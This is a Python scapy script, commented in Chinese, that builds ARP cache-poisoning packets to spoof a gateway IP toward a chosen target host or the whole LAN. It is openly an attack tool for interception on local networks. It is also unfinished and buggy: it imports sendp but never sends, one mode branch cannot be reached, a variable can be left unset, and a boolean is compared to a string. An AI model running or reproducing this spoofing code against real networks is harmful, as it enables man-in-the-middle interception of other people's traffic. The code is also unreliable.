import os
import sys
from optparse import OptionParser

from scapy.all import (
    get_if_hwaddr,
    sendp
)
from scapy.layers.l2 import Ether, ARP, getmacbyip


def main():
    def build_req():
        # 直接攻击网卡的模式
        if options.mode is None:
            pkt = Ether(src=mac,dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=mac,psrc=args[0],pdst=args[0],op=2)
        # 攻击单一ip的模式
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print("can't get the ip address")
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target)
        return pkt

    def build_rep():  # 构造响应数据包
        if options.target is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2)
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print("[-] Error: 无法获取目标mac地址")
                sys.exit(1)

            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target,
                                                       op=2)

        return pkt


    usage = 'Usage: python3 %prog [-i interface] [-t target] host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='请指定网卡')
    parser.add_option('-t', dest='target', help='请指定要欺骗的目标主机')
    parser.add_option('-m', dest='mode', default='req', help='毒化模式: requests (req) or replies (rep) [default: %default]')
    parser.add_option('-s', action='store_true', dest='summary', default=False, help='显示数据包发送信息')
    (options,args)=parser.parse_args()
    if len(args) !=1 or options.interface is None:
        #这里的interface是上面的.interface的东西
        parser.print_help()
        sys.exit(0)
    mac = get_if_hwaddr(options.interface)
    print(f"本地的mac地址是{mac}")
    if options.mode=="req":
        pkt = build_req()
    elif options.mode=="rep":
        pkt = build_rep()
    if options.summary =="True":
        pkt.show()
        ans = input('\n[*] 是否继续? [Y|n]: ').lower()
        if ans == 'y' or len(ans) == 0:
            pass
        else:
            sys.exit(0)

    # if(is_valid_ipv4_address(options.target)):
    #     target = options.target
    #如果用户在终端中没有传入目的ip则构建广播包，否则为定向欺骗数据包。

if __name__ == '__main__':
    main()